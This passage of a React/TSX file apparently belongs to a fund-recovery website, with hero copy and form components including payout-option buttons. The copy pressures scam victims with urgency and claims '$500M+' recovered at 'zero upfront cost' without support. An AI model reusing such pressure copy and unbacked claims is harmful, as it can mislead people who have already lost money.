              <p className="mt-6 text-lg sm:text-xl text-muted-foreground leading-relaxed max-w-2xl">
                Every hour you wait, scammers move your money further out of reach. Our specialists have recovered over <span className="font-bold text-primary">$500M+</span> for victims just like you — with zero upfront cost.
              </p>
            </Reveal>
          </form>
        )}
      </section>
    </SiteShell>
  );
}

// ─── Shared sub-components ───────────────────────────────────────────────────

function Section({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <div className="mb-8">
      <h3 className="text-lg font-bold mb-4">{title}</h3>
      {children}
    </div>
  );
}

function Label({ children }: { children: React.ReactNode }) {
  return <label className="block text-xs font-medium text-muted-foreground mb-1">{children}</label>;
}

function Input({ label, className = "", ...props }: { label: string; className?: string } & React.InputHTMLAttributes<HTMLInputElement>) {
  return (
    <div className={className}>
      <Label>{label}</Label>
      <input
        {...props}
        className="h-11 w-full rounded-lg border border-input bg-white px-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring"
      />
    </div>
  );
}

function Select({ label, children, ...props }: { label: string; children: React.ReactNode } & React.SelectHTMLAttributes<HTMLSelectElement>) {
  return (
    <div>
      <Label>{label}</Label>
      <select {...props} className="h-11 w-full rounded-lg border border-input bg-white px-3 text-sm">
        {children}
      </select>
    </div>
  );
}

function PayoutOption({ selected, onClick, icon, title, desc, badge, recommended }: { selected: boolean; onClick: () => void; icon: React.ReactNode; title: string; desc: string; badge?: string; recommended?: boolean }) {
  return (
    <button
      type="button"
      onClick={onClick}
      className={`relative text-left p-4 rounded-xl border-2 transition h-full flex flex-col ${
        selected ? "border-primary bg-primary/5 shadow-inner" : "border-border bg-white hover:border-primary/40"
      } ${recommended ? "ring-2 ring-primary ring-offset-2" : ""}`}
    >
      {recommended && (
        <div className="absolute -top-3 left-1/2 -translate-x-1/2 bg-primary text-white text-[10px] font-black uppercase tracking-tighter px-3 py-1 rounded-full shadow-lg whitespace-nowrap">
          Recommended
        </div>
      )}
      <div className="flex items-center justify-between mb-2">
        <div className={`p-2 rounded-lg ${selected ? "bg-primary text-white" : "bg-slate-100 text-slate-500"}`}>
          {icon}
        </div>
        {badge && (
          <span className={`text-[9px] font-bold uppercase tracking-wider px-2 py-0.5 rounded ${
            selected ? "bg-primary/20 text-primary" : "bg-slate-100 text-slate-500"
          }`}>
            {badge}
          </span>
        )}
      </div>
      <div className="font-bold text-sm text-slate-900 mb-1">{title}</div>
      <p className="text-[11px] text-slate-500 leading-snug">{desc}</p>
    </button>
  );
}

